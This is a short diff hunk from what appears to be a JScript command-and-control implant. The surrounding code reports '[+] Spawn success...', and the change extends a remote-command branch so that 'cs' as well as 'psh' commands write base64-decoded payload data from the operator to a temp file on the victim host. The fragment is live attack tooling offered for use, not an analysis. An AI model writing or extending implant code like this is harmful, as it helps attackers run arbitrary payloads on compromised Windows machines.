@@ -133,9 +133,9 @@ while(true)
 		    retval = "[+] Spawn success..."
 	    }
 
-      //psh runs ... you know what
+      //psh and cs
       //duplicate code here and cmnd... :(
-      else if(jsObject.cmnd.split(" ")[0] == "psh") {
+      else if((jsObject.cmnd.split(" ")[0] == "psh") || (jsObject.cmnd.split(" ")[0] == "cs")) {
          fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
          msb = jsObject.cmnd.split(" ")[1]
          msbdata = b64d(jsObject.cmnd.split(" ")[2])
